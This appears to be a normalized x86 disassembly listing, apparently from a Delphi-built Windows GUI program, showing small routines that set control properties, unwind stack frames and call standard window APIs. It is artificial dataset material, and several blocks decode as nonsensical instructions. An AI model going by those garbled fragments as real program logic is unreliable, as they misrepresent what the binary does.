call sub_4185b0
pop esi
pop ebx
retn
sub_437604
mov eax [ eax + 0x34 ]
call sub_4186fc
retn
sub_4376d4
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4376cc
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_403154
sub_43779c
push ebx
mov ebx eax
mov eax ebx
call sub_437bec
push eax
mov eax ebx
call sub_4376f8
pop edx
call sub_42a078
pop ebx
retn
sub_437bd8
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_437bec
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_437e24
retn
mov eax [ eax + 0x18 ]
retn
sub_437c38
mov eax [ eax + 0x8 ]
call sub_4375f0
retn
sub_437d18
or ecx 0xffffffff
xor edx edx
call sub_437d24
retn
sub_437e4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_437d98
mov ecx 0x1
mov edx esi
call sub_42a164
pop esi
pop ebx
retn
sub_437e68
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_450a20
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_437d98
call sub_429ea8
sub_437e88
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_437ea0
sub_438021
jmp sub_4038d0
sub_438064
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_437ea0
sub_43837c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4026fc
retn
sub_438388
jmp sub_4038d0
j_sub_43837c
jmp sub_43837c
sub_43838f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383b1
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f74
retn
sub_4383aa
jmp sub_4038d0
sub_4383b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43863f
jmp sub_4038d0
sub_438646
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438668
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403f74
retn
sub_438661
jmp sub_4038d0
sub_438668
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438670
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437da4
call sub_4376d4
pop esi
pop ebx
retn
sub_438688
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_438720
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_44dcbc
sub_438734
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_44dcbc
sub_438748
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_44dcbc
sub_438c64
jmp sub_4038d0
sub_438dba
jmp sub_4038d0
sub_439111
jmp sub_4038d0
sub_439118
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43913b
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405110
retn
sub_439134
jmp sub_4038d0
sub_43913b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439219
jmp sub_40361c
sub_43921e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439319
jmp sub_40361c
sub_43931e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4395e4
cmp dl [ eax + 0x277 ]
je r-xdata
retn
mov [ eax + 0x277 ] dl
call sub_439358
sub_4395f8
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
call sub_439358
sub_439660
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
call sub_44dcbc
sub_439674
cmp dl [ eax + 0x27a ]
je r-xdata
retn
mov [ eax + 0x27a ] dl
call sub_439358
sub_439688
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_439358
sub_43969c
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_439358
sub_4396b0
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_44dcbc
sub_4396c4
cmp dl [ eax + 0x22a ]
je r-xdata
retn
mov [ eax + 0x22a ] dl
call sub_44dcbc
sub_439720
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_44dcbc
sub_439734
cmp dl [ eax + 0x22b ]
je r-xdata
retn
mov [ eax + 0x22b ] dl
call sub_44dcbc
sub_439748
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax ebx
call sub_45071c
pop edx
call sub_42a020
pop ebx
retn
sub_439a13
jmp sub_4038d0
sub_439a1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439a38
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_439a44
cmp [ eax + 0x264 ] 0x0
setne al
retn
sub_439a90
cmp dl [ eax + 0x238 ]
je r-xdata
retn
mov [ eax + 0x238 ] dl
call sub_44dcbc
sub_439aa4
cmp dl [ eax + 0x216 ]
je r-xdata
retn
mov [ eax + 0x216 ] dl
call sub_44dcbc
sub_439cec
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437cb0
retn
sub_439e69
jmp sub_4038d0
sub_439e70
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439e7c
push ebx
mov ebx eax
mov eax ebx
call sub_45071c
call sub_42a190
pop ebx
retn
sub_43a16d
jmp sub_4038d0
sub_43a517
jmp sub_4038d0
sub_43a6dd
jmp sub_4038d0
sub_43abb2
jmp sub_4038d0
sub_43abb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ac34
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_43ac84
push ebx
cmp [ eax + 0x362 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_43acfd
jmp sub_4038d0
sub_43ad04
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ae61
jmp sub_4038d0
sub_43ae68
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b1c8
mov eax [ eax + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43b1d4
push esi
mov esi eax
mov eax [ esi + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43b440
mov eax [ eax + 0x23c ]
call sub_437044
retn
sub_43b4cc
push ebx
cmp [ eax + 0x34a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34c ]
call [ ebx + 0x348 ]
sub_43bb07
jmp sub_4038d0
sub_43bb24
jmp sub_4038d0
sub_43bb2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bc81
jmp sub_4038d0
sub_43bc88
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bc98
mov [ eax + 0x28a ] 0x1
retn
sub_43c0fb
jmp sub_4038d0
sub_43c102
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c134
mov [ eax + 0x294 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43c259
jmp sub_4038d0
sub_43c260
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c268
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
sub_43c2ac
push ebx
mov ebx eax
mov eax ebx
call sub_45071c
call sub_42a21c
pop ebx
retn
sub_43c539
jmp sub_4038d0
sub_43c540
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c548
mov eax [ eax + 0x22c ]
call sub_437d74
retn
sub_43c5dd
jmp sub_4038d0
sub_43c5e4
pop ecx
pop ebp
retn
sub_43c5e8
mov eax [ r-xdata ]
retn
sub_43c76c
push ebx
mov ebx eax
mov eax ebx
call sub_4190b0
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43c7d8
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43c7f4
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43c810
push ebx
mov ebx eax
mov eax ebx
call sub_42fcc8
pop ebx
retn
sub_43c884
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42fe34
pop esi
pop ebx
retn
sub_43ca29
add [ esp + 0x4 ] 0xffffffec
jmp sub_43dc28
sub_43ca33
add [ esp + 0x4 ] 0xffffffec
jmp sub_43dd14
sub_43ca3d
add [ esp + 0x4 ] 0xffffffec
jmp sub_43dd00
sub_43ca47
add [ esp + 0x4 ] 0xffffffec
jmp sub_43db78
sub_43ca5b
add [ esp + 0x4 ] 0xffffffec
jmp sub_405890
sub_43ca65
add [ esp + 0x4 ] 0xffffffec
jmp sub_4058a4
sub_43ca70
push ecx
0x43
sub_43ca74
pop ebx
0x43
sub_43ca78
0x43
sub_43ca7c
sub edx ecx
inc ebx
add [ ebx ] dh
0x43
sub_43ca84
cmp eax 0x470043ca
0x43
sub_43cfb0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43d1e7
jmp sub_4038d0
sub_43d2e3
jmp sub_4038d0
sub_43d2ea
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d2f0
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_43d30c
mov eax [ r-xdata ]
retn
sub_43d314
mov eax [ r-xdata ]
retn
sub_43d416
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_43d5ad
jmp sub_4038d0
sub_43d5b4
pop ebx
pop ecx
pop ebp
retn
sub_43d5e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x220 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x224 ] edx
pop ebp
retn 0x8
sub_43d6ae
jmp sub_4038d0
sub_43d6b5
pop ecx
pop ebp
retn
sub_43d744
mov eax [ eax + 0x14 ]
call sub_4195d0
retn
sub_43d88d
jmp sub_4038d0
sub_43d894
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d8c0
mov eax [ eax + 0x14 ]
call sub_4192f0
retn
sub_43d8cc
mov eax [ eax + 0x14 ]
call sub_4192f0
retn
sub_43d8d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_43d93c
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_43d944
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_43c898
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_43d98c
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_43c898
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_43d9e0
mov eax [ r-xdata ]
retn
sub_43d9e8
mov eax [ r-xdata ]
retn
sub_43da58
jmp sub_4038d0
sub_43da5f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43db34
jmp sub_4038d0
sub_43db3b
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43dbf8
mov eax [ eax + 0xc ]
call sub_4192f0
retn
sub_43dcee
jmp sub_4038d0
sub_43dcf5
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43dd00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_43ddaf
jmp sub_4038d0
sub_43ddb6
pop ebp
retn
sub_43ddb8
sub [ rw-data ] 0x1
retn
sub_43de27
jmp [ edi ]
sub_43e0c8
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e0e0
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43e124
push ebx
mov ebx eax
mov eax ebx
call sub_43e7b4
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43e7a3
jmp sub_4038d0
sub_43e7b4
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42c880
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43e0f4
sub_43e80b
jmp sub_4038d0
sub_43e812
pop ebp
retn
sub_43e814
sub [ rw-data ] 0x1
retn
sub_441110
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_4411c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449e20
pop esi
pop ebx
retn
sub_44132a
jmp sub_4038d0
sub_441331
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441440
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44bedc
mov eax ebx
mov si 0xffc7
call sub_403350
pop esi
pop ebx
retn
sub_44152c
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441548
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403350
sub_441564
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_441570
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_42109c
sub_441584
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4415e4
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441658
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403350
pop esi
pop ebx
retn
sub_441674
push esi
mov esi eax
mov eax esi
call sub_44b9e8
mov eax esi
mov si 0xffc7
call sub_403350
pop esi
retn
sub_441719
jmp sub_4038d0
sub_441720
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441728
push ebx
mov ebx eax
mov eax ebx
call sub_44bb4c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_44174c
push ebx
mov ebx eax
mov eax ebx
call sub_44bb64
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_441838
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_441e44
sub_44184c
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_441e44
mov eax ebx
call sub_44dcbc
sub_441870
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44dcbc
sub_441884
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44dcbc
sub_4418c8
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44dcbc
sub_4419c9
jmp sub_4038d0
sub_4419d0
pop ebx
pop ecx
pop ebp
retn
sub_441ae8
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_45071c
push eax
call SetWindowTextA
pop ebx
retn
sub_441b04
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_441baa
jmp sub_4038d0
sub_441bb1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441c4a
jmp sub_4038d0
sub_441dc3
jmp sub_4038d0
sub_441e28
push ebx
mov ebx eax
mov eax ebx
call sub_4418dc
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44dab8
pop ebx
retn
sub_441f28
push ebx
mov ebx eax
mov eax ebx
call sub_449a2c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_442020
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403350
sub_4420d0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_442152
jmp sub_4038d0
sub_442159
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442244
jmp sub_4038d0
sub_44224b
pop ebx
pop ecx
pop ebp
retn
sub_44241c
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_449dfc
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44246c
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_442560
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_44dcbc
sub_442594
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44259c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4425a4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4425d0
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44afd4
sub_442700
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_4429d7
jmp sub_40361c
sub_4429dc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442c68
jmp sub_4038d0
sub_442c6f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442c78
push ebx
mov ebx eax
mov eax ebx
call sub_449a2c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_442c9c
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_442d18
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_442e32
jmp sub_4038d0
sub_442e7c
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_442f07
jmp sub_4038d0
sub_442f0e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442f40
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_442f4c
mov [ eax + 0x210 ] edx
retn
sub_442f9d
jmp sub_4038d0
sub_442fa4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44305e
jmp sub_4038d0
sub_443108
mov eax [ r-xdata ]
retn
sub_443110
xor eax eax
retn
sub_443134
retn
sub_44324c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44dcbc
sub_443338
push ebx
mov ebx eax
mov eax ebx
call sub_449a2c
mov eax ebx
call sub_44b35c
pop ebx
retn
sub_44334c
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_443358
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44dcbc
sub_44336c
test dl dl
je r-xdata
xor edx edx
call sub_443380
retn
mov dl 0x1
call sub_443380
retn
sub_44345c
push ebx
mov ebx eax
mov eax ebx
call sub_44ed08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_443470
call sub_44dcbc
retn
sub_443506
jmp sub_4038d0
sub_44350d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443514
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_443584
mov al [ eax + 0x211 ]
retn
sub_4435b8
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44dcbc
sub_443798
call sub_44dcbc
retn
sub_443815
jmp sub_4038d0
sub_44381c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443879
jmp sub_4038d0
sub_443880
pop ebp
retn
sub_443884
sub [ rw-data ] 0x1
retn
sub_4439e1
jmp sub_4038d0
sub_4439e8
pop ebp
retn
sub_4439ec
sub [ rw-data ] 0x1
retn
sub_4439f4
xchg esi eax
dec eax
add al dh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_44426c
sub_443a05
add eax 0xffffffe0
jmp sub_443fec
sub_443a0d
add eax 0xffffffe0
jmp sub_444054
sub_443a15
add eax 0xffffffe0
jmp sub_444168
sub_443a1d
add eax 0xffffffe0
jmp sub_4441dc
sub_443a25
add eax 0xffffffe0
jmp sub_443c98
sub_443a2d
add eax 0xffffffe0
jmp sub_443cac
sub_443a35
add eax 0xffffffe0
jmp sub_443d24
sub_443a3d
add eax 0xffffffe0
jmp sub_443dc8
sub_443a45
add eax 0xffffffe0
jmp sub_443dcc
sub_443a4d
add eax 0xffffffe0
jmp sub_443e54
sub_443a55
add eax 0xffffffe0
jmp sub_443f9c
sub_443a5d
add eax 0xffffffe0
jmp sub_443fa0
sub_443a65
add eax 0xffffffe0
jmp sub_443fbc
sub_443a77
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405890
sub_443a81
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4058a4
sub_443c55
jmp sub_4038d0
sub_443c5c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443c98
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fa4
pop ebx
retn
sub_443d13
jmp sub_4038d0
sub_443d1a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443dac
jmp sub_4038d0
sub_443db3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443dc8
mov al 0x1
retn
sub_443e47
jmp sub_4038d0
sub_443e4e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443f4c
jmp sub_4038d0
sub_443f53
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443f9c
mov [ eax + 0xc ] edx
retn
sub_443fa0
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_444044
jmp sub_4038d0
sub_44404b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44414a
jmp sub_4038d0
sub_444151
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4441ca
jmp sub_4038d0
sub_4441d1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44425c
jmp sub_4038d0
sub_444263
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444357
jmp sub_4038d0
sub_44435e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_444420
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_44436c
call EnumWindows
retn
sub_4444b2
jmp sub_4038d0
sub_4444b9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4444c4
xor eax eax
retn
sub_4445bd
jmp sub_4038d0
sub_4445c4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4446ae
jmp sub_4038d0
sub_4446b5
pop ebp
retn
sub_44470a
jmp sub_4038d0
sub_444711
pop ebp
retn
sub_445878
jmp r-xdata
sub_44587a
0xe8ffe9ff 0xe7ff
sub_445881
jmp esi
sub_446178
inc esp
add [ eax - 0x10 ] bl
inc esp
add ah ah
iretd
sub_446c00
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_446f13
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417ed4
retn
sub_446f30
push 0x15
mov ecx rw-data
call sub_417e94
retn
sub_446fc8
call GetCapture
call sub_446d00
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44722c
push ebx
push eax
push sub_4473b0
call sub_422118
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_447244
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_447274
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_4221cc
pop ebx
retn
sub_447352
jmp sub_40361c
sub_447384
xor eax eax
retn
sub_447388
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_4473a0
retn
sub_4473a4
mov eax [ rw-data ]
retn
sub_4473ac
retn
sub_4473da
jmp sub_40361c
sub_4473df
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4473fc
call sub_403394
xor eax eax
mov [ rw-data ] eax
retn
sub_44740c
call sub_403390
xor eax eax
mov [ rw-data ] eax
retn
sub_44741c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4474cc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_4474e4
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_447530
retn
sub_4476e8
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403350
pop esi
retn
sub_4476fc
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403350
pop esi
retn
sub_447710
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44771c
mov eax 0x4
retn
sub_447724
retn
sub_448315
jmp sub_40361c
sub_448602
jmp sub_4038d0
